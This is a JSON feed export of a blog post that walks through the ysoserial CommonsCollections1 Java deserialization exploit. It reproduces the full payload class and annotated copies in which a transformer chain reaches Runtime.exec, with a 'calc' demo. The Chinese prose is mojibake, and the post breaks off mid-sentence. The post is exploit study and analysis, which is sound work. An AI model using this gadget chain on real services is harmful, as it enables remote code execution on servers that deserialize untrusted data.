{
    "version": "https://jsonfeed.org/version/1",
    "title": "Milkii0çš„ç§˜å¯†èŠ±å›­ â€¢ All posts by \"javaååºåˆ—åŒ–\" tag",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2021/09/07/dmsj/ysoserial%E4%B9%8BCommonsCollections1%E8%B0%83%E8%AF%95/",
            "url": "http://example.com/2021/09/07/dmsj/ysoserial%E4%B9%8BCommonsCollections1%E8%B0%83%E8%AF%95/",
            "title": "ysoserialä¹‹CommonsCollections1è°ƒè¯•",
            "date_published": "2021-09-07T02:12:48.000Z",
            "content_html": "<h1 id=\"åˆ©ç”¨é“¾ç®€è¿°\"><a class=\"markdownIt-Anchor\" href=\"#åˆ©ç”¨é“¾ç®€è¿°\">#</a> åˆ©ç”¨é“¾ç®€è¿°</h1>\n<ol>\n<li>ä»»æ„æ–¹æ³•æ‰§è¡Œ</li>\n<li>é«˜ç‰ˆæœ¬ java å·²ä¿®å¤ï¼ˆJava 8u71 ä»¥åï¼‰</li>\n</ol>\n<h1 id=\"commonscollections1åˆ©ç”¨ä»£ç \"><a class=\"markdownIt-Anchor\" href=\"#commonscollections1åˆ©ç”¨ä»£ç \">#</a> CommonsCollections1 åˆ©ç”¨ä»£ç </h1>\n<p>é¡¹ç›®åœ°å€ï¼š<a href=\"https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar\">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</a></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\tGadget chain:</span></span><br><span class=\"line\"><span class=\"comment\">\t\tObjectInputStream.readObject()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\tAnnotationInvocationHandler.readObject()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\tMap(Proxy).entrySet()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\tAnnotationInvocationHandler.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\tLazyMap.get()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\tChainedTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tConstantTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tClass.getMethod()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tRuntime.getRuntime()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tRuntime.exec()</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\tRequires:</span></span><br><span class=\"line\"><span class=\"comment\">\t\tcommons-collections</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"meta\">@SuppressWarnings(&#123;&quot;rawtypes&quot;, &quot;unchecked&quot;&#125;)</span></span><br><span class=\"line\"><span class=\"meta\">@PayloadTest</span> ( precondition = <span class=\"string\">&quot;isApplicableJavaVersion&quot;</span>)</span><br><span class=\"line\"><span class=\"meta\">@Dependencies(&#123;&quot;commons-collections:commons-collections:3.1&quot;&#125;)</span></span><br><span class=\"line\"><span class=\"meta\">@Authors(&#123; Authors.FROHOFF &#125;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CommonsCollections1</span> <span class=\"keyword\">extends</span> <span class=\"title\">PayloadRunner</span> <span class=\"keyword\">implements</span> <span class=\"title\">ObjectPayload</span>&lt;<span class=\"title\">InvocationHandler</span>&gt; </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> InvocationHandler <span class=\"title\">getObject</span><span class=\"params\">(<span class=\"keyword\">final</span> String command)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> String[] execArgs = <span class=\"keyword\">new</span> String[] &#123; command &#125;;</span><br><span class=\"line\">\t\t<span class=\"comment\">// inert chain for setup</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Transformer transformerChain = <span class=\"keyword\">new</span> ChainedTransformer(</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">new</span> Transformer[]&#123; <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;);</span><br><span class=\"line\">\t\t<span class=\"comment\">// real chain for after setup</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[] &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">\t\t\t\t\tString.class, Class[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">new</span> Class[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">\t\t\t\t\tObject.class, Object[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">null</span>, <span class=\"keyword\">new</span> Object[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>,</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map innerMap = <span class=\"keyword\">new</span> HashMap();</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tReflections.setFieldValue(transformerChain, <span class=\"string\">&quot;iTransformers&quot;</span>, transformers); <span class=\"comment\">// arm with actual transformer chain</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> handler;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">final</span> String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">\t\tPayloadRunner.run(CommonsCollections1.class, args);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">boolean</span> <span class=\"title\">isApplicableJavaVersion</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> JavaVersion.isAnnInvHUniversalMethodImpl();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"è°ƒè¯•åˆ†æ\"><a class=\"markdownIt-Anchor\" href=\"#è°ƒè¯•åˆ†æ\">#</a> è°ƒè¯•åˆ†æ</h1>\n<p>ysoserialPOC ç±»ä¸­ getObject æ–¹æ³•ä¸€èˆ¬æ˜¯è·å– payload çš„æ–¹æ³•</p>\n<h2 id=\"åˆ†æpaylaodæ„é€ \"><a class=\"markdownIt-Anchor\" href=\"#åˆ†æpaylaodæ„é€ \">#</a> åˆ†æ paylaod æ„é€ </h2>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> InvocationHandler <span class=\"title\">getObject</span><span class=\"params\">(<span class=\"keyword\">final</span> String command)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">    \t<span class=\"comment\">// ä¼ å…¥çš„å‘½ä»¤å‚æ•°å­˜å‚¨äºexecArgsæ•°ç»„ä¸­</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> String[] execArgs = <span class=\"keyword\">new</span> String[] &#123; command &#125;;</span><br><span class=\"line\">    \t<span class=\"comment\">// å¼€å§‹æ„é€ transformerChainï¼Œç”¨äºæ‰§è¡Œå‘½ä»¤</span></span><br><span class=\"line\">\t\t<span class=\"comment\">// inert chain for setup</span></span><br><span class=\"line\">    \t<span class=\"comment\">// è¿™ä¸€æ­¥æ®pç¥æ‰€è¨€æ˜¯ä¸ºäº†éšè—æ—¥å¿—ä¸­çš„è¿›ç¨‹æ—¥å¸¸ä¿¡æ¯ï¼Œ åŠ ä¸åŠ éƒ½ä¼šæ‰§è¡Œå‘½ä»¤ï¼Œåªæ˜¯å¼‚å¸¸ä¿¡æ¯ä¸åŒ</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Transformer transformerChain = <span class=\"keyword\">new</span> ChainedTransformer(</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">new</span> Transformer[]&#123; <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;);</span><br><span class=\"line\">\t\t<span class=\"comment\">// real chain for after setup</span></span><br><span class=\"line\">    \t<span class=\"comment\">// é€šè¿‡åå°„è·å¾—Runtime.exec(),å¹¶å°†å‘½ä»¤å‚æ•°execArgsä¼ å…¥</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[] &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">\t\t\t\t\tString.class, Class[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">new</span> Class[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">\t\t\t\t\tObject.class, Object[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">null</span>, <span class=\"keyword\">new</span> Object[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>,</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) </span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">\t\t<span class=\"comment\">// ä¿®é¥°innerMapï¼Œå°†æ„é€ çš„transformerChainä¼ å…¥</span></span><br><span class=\"line\">    \t<span class=\"comment\">// å½“LayMap#getè¢«è°ƒç”¨æ—¶ï¼Œä¼šæ‰§è¡Œä¼ å…¥çš„transformerChain</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map innerMap = <span class=\"keyword\">new</span> HashMap();</span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">    \t<span class=\"comment\">// å°†lazyMapä¼ å…¥AnnotationInvocationHandler</span></span><br><span class=\"line\">    \t<span class=\"comment\">// javaä»£ç†sun.reflect.annotation.AnnotationInvocationHandler</span></span><br><span class=\"line\">    \t<span class=\"comment\">// è·å¾—ä»£ç†å¯¹è±¡æ—¶ï¼Œä¼šå†ä¼ å…¥ä¸€ä¸ªhandlerï¼ˆç®€ç§°handler2ï¼‰ï¼Œå¾—åˆ°ä»£ç†å¯¹è±¡mapProxyï¼Œ</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class=\"line\">\t\t<span class=\"comment\">// å°†è¯¥ä»£ç†å¯¹è±¡åŒ…è£¹è¿›å…¥æ–°çš„handlerï¼Œç®€ç§°handler1</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class=\"line\">\t\t<span class=\"comment\">// æœ€åå°†æ„é€ å¥½çš„å‘½ä»¤æ‰§è¡Œtransformersä¼ å…¥transformerChain</span></span><br><span class=\"line\">    \t<span class=\"comment\">// æœ€åæ”¾æ˜¯ä¸ºäº†é˜²æ­¢åœ¨æ„é€ payloadæ—¶å¼¹å‡ºè®¡ç®—å™¨</span></span><br><span class=\"line\">\t\tReflections.setFieldValue(transformerChain, <span class=\"string\">&quot;iTransformers&quot;</span>, transformers); <span class=\"comment\">// arm with actual transformer chain</span></span><br><span class=\"line\">\t\t<span class=\"comment\">// æœ€ååŒ…è£…å¥½çš„handlerå³ä¸ºæˆ‘ä»¬çš„payload</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> handler;</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"çŸ¥è¯†ç‚¹\"><a class=\"markdownIt-Anchor\" href=\"#çŸ¥è¯†ç‚¹\">#</a> çŸ¥è¯†ç‚¹</h3>\n<p>éœ€è¦ç†è§£çš„çŸ¥è¯†ç‚¹ä¸»è¦æœ‰ä¸¤éƒ¨åˆ†ï¼štransform å’Œ proxy</p>\n<p>æƒ³è¦æ·±ç©¶çš„è¯å¯ä»¥å»çœ‹è¯¦ç»†è§£é‡Šï¼Œä»¥ä¸‹åªè®°å½•æ­¤å¤„ç”¨åˆ°çš„ç‚¹</p>\n<p>æˆ‘çœ‹ä»£ç†çš„æ—¶å€™æ˜¯å‚è€ƒçš„è¿™ç¯‡æ–‡ç« ï¼š<a href=\"https://xie.infoq.cn/article/9a9387805a496e1485dc8430f\">https://xie.infoq.cn/article/9a9387805a496e1485dc8430f</a></p>\n<h4 id=\"å…ˆæ¥çœ‹çœ‹trasnform\"><a class=\"markdownIt-Anchor\" href=\"#å…ˆæ¥çœ‹çœ‹trasnform\">#</a> å…ˆæ¥çœ‹çœ‹ trasnform</h4>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">final</span> Transformer transformerChain = <span class=\"keyword\">new</span> ChainedTransformer(</span><br><span class=\"line\">    <span class=\"keyword\">new</span> Transformer[]&#123; <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;);</span><br><span class=\"line\"><span class=\"comment\">// real chain for after setup</span></span><br><span class=\"line\"><span class=\"keyword\">final</span> Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[] &#123;</span><br><span class=\"line\">    <span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">    <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">        String.class, Class[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">new</span> Class[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">    <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">        Object.class, Object[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">        <span class=\"keyword\">null</span>, <span class=\"keyword\">new</span> Object[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">    <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>,</span><br><span class=\"line\">        <span class=\"keyword\">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class=\"line\">    <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;;</span><br></pre></td></tr></table></figure>\n<p><strong>ConstantTransformer</strong></p>\n<p>æ„é€ æ–¹æ³•ä¼ å…¥ä¸€ä¸ªç±»</p>\n<p>é€šè¿‡è¯¥ç±»çš„ transform æ–¹æ³•è·å–ä¸€ä¸ªå¯¹è±¡ç±»å‹ï¼Œå¦‚ transform å‚æ•°æ˜¯ Runtime.class æ—¶ï¼Œè°ƒç”¨ ConstantTransformer ç±»çš„ transform æ–¹æ³•ï¼Œæ‰§è¡Œåè¿”å› java.lang.Runtime ç±»</p>\n<p><strong>InvokerTransformer</strong></p>\n<p>æ„é€ æ–¹æ³• InvokerTransformer (String methodName, Class [] paramTypes, Object [] args)</p>\n<p>ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ–¹æ³•åï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºæ–¹æ³•å‚æ•°ç±»å‹æ•°ç»„ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºæ–¹æ³•å‚æ•°æ•°ç»„</p>\n<p>è¯¥ç±»çš„ transform é€šè¿‡åå°„æ‰§è¡Œå‡½æ•°</p>\n<p>ä¾‹å¦‚ä¸‹é¢çš„ä»£ç ï¼Œtransform ä¼ å…¥ Runtime å¯¹è±¡ï¼Œé€šè¿‡åå°„æ‰§è¡Œ exec å‡½æ•°ï¼Œä¼ å…¥å‘½ä»¤ä¸º calc</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">InvokerTransformer invokerTransformer = <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class&#125;,<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;);</span><br><span class=\"line\">invokerTransformer.transform(Runtime.getRuntime());</span><br></pre></td></tr></table></figure>\n<p><strong>transformerChain</strong></p>\n<p>transformers çš„é“¾ï¼Œæ„é€ æ–¹æ³•ä¼ å…¥ä¸€ä¸ª transform æ•°ç»„</p>\n<p>ä¸²èµ·æ¥äº†å¾ˆå¤š transformer</p>\n<p>ä¸ºä»€ä¹ˆæ˜¯ä¸²èµ·æ¥çš„å‘¢ï¼Œè§ä¸‹å›¾</p>\n<p><img src=\"62.png\" alt=\"\"></p>\n<p>å…¶ä¸­å‰é¢ä¸€ä¸ª transform è¾“å‡ºçš„ç»“æœä¼šä½œä¸ºå‚æ•°ä¼ å…¥åä¸€ä¸ª transform</p>\n<p>é‚£ä¹ˆæ­¤å¤„ä»£ç å°±å¯ä»¥å¾ˆå¥½çš„è§£é‡Šå•¦</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// é€šè¿‡åå°„è·å–Runtimeï¼Œå› ä¸ºClassç±»å®ç°äº†Serializableæ¥å£</span></span><br><span class=\"line\"><span class=\"comment\">//        Method f = Runtime.class.getMethod(&quot;getRuntime&quot;);</span></span><br><span class=\"line\"><span class=\"comment\">//        Runtime r = (Runtime) f.invoke(null);</span></span><br><span class=\"line\"><span class=\"comment\">//        r.exec(&quot;C:\\\\WINDOWS\\\\system32\\\\calc.exe&quot;</span></span><br><span class=\"line\">\t<span class=\"keyword\">final</span> Transformer transformerChain = <span class=\"keyword\">new</span> ChainedTransformer(</span><br><span class=\"line\">        <span class=\"keyword\">new</span> Transformer[]&#123; <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;);</span><br><span class=\"line\">    <span class=\"comment\">// real chain for after setup</span></span><br><span class=\"line\">    <span class=\"keyword\">final</span> Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[] &#123;</span><br><span class=\"line\">        <span class=\"comment\">// è¿”å›java.lang.Runtimeç±»</span></span><br><span class=\"line\">        <span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),  </span><br><span class=\"line\">        <span class=\"comment\">//ä¼ å…¥ä¸Šé¢transformå¾—åˆ°çš„Runtimeç±»ï¼ˆClasså¯¹è±¡ï¼‰ï¼Œè°ƒç”¨getMethodæ–¹æ³•ï¼Œä¼ å…¥è°ƒç”¨getMethodæ–¹æ³•æ–¹æ³•å‚æ•°ä¸ºgetRuntimeï¼›ä¹Ÿå°±æ˜¯è·å–è¯¥ç±»çš„getRuntimeæ–¹æ³•</span></span><br><span class=\"line\">        <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123; </span><br><span class=\"line\">            String.class, Class[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">new</span> Class[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">        <span class=\"comment\">// ä¼ å…¥ä¸Šé¢transformå¾—åˆ°çš„getRuntimeæ–¹æ³•ï¼ˆMethodå¯¹è±¡ï¼‰ï¼Œè°ƒç”¨invokeæ–¹æ³•ï¼Œä¼ å…¥invokeæ–¹æ³•çš„å‚æ•°ä¸ºObject[]ï¼Œå…¶å®å°±æ˜¯æŒ‰ç…§å‚æ•°åˆ—è¡¨ä¼ å°±å¥½äº†ï¼Œå› ä¸ºæ­¤å¤„åªéœ€è¦è°ƒç”¨invokeæ–¹æ³•è·å¾—Runtimeå¯¹è±¡</span></span><br><span class=\"line\">        <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[] &#123;</span><br><span class=\"line\">            Object.class, Object[].class &#125;, <span class=\"keyword\">new</span> Object[] &#123;</span><br><span class=\"line\">            <span class=\"keyword\">null</span>, <span class=\"keyword\">new</span> Object[<span class=\"number\">0</span>] &#125;),</span><br><span class=\"line\">        <span class=\"comment\">// ä¼ å…¥ä¸Šé¢transformå¾—åˆ°çš„Runtimeå¯¹è±¡ï¼Œè°ƒç”¨execæ–¹æ³•ï¼Œä¼ å…¥è¯¥æ–¹æ³•çš„å‚æ•°ä¸ºexecArgs</span></span><br><span class=\"line\">        <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>,</span><br><span class=\"line\">            <span class=\"keyword\">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class=\"line\">        <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>) &#125;;</span><br></pre></td></tr></table></figure>\n<h4 id=\"æœ€ååº·åº·proxy\"><a class=\"markdownIt-Anchor\" href=\"#æœ€ååº·åº·proxy\">#</a> æœ€ååº·åº· proxy</h4>\n<p>ä¸ºä»€ä¹ˆä¼šåˆ©ç”¨åˆ°å¯¹è±¡ä»£ç†å‘¢ï¼Ÿ</p>\n<p>å½“ç„¶æ˜¯å› ä¸ºä»£ç†çš„ä¸€äº›äº›ç‰¹æ€§è¾£</p>\n<p>æ¯ä¸ªä»£ç†ç±»æœ‰ä¸€ä¸ªå…¬å…±æ„é€ ä¸€ä¸ªå‚æ•°ï¼Œè¯¥æ¥å£çš„å®ç° <code>InvocationHandler</code>  ï¼Œè®¾ç½®è°ƒç”¨å¤„ç†ç¨‹åºçš„ä»£ç†å®ä¾‹</p>\n<p>åº·åº·æ„é€ æ–¹æ³•ï¼Œä¼šä¼ å…¥ä¸€ä¸ª InvocationHandler å¯¹è±¡</p>\n<p>å¹¶ä¸”åœ¨è°ƒç”¨è¯¥ä»£ç†å¯¹è±¡ä»»æ„æ–¹æ³•æ—¶ï¼Œä¼šè°ƒç”¨ InvocationHandler#invoke ()</p>\n<p><img src=\"63.png\" alt=\"\"></p>\n<p>ä½†æ˜¯è¯¥æ–¹æ³•æ˜¯ 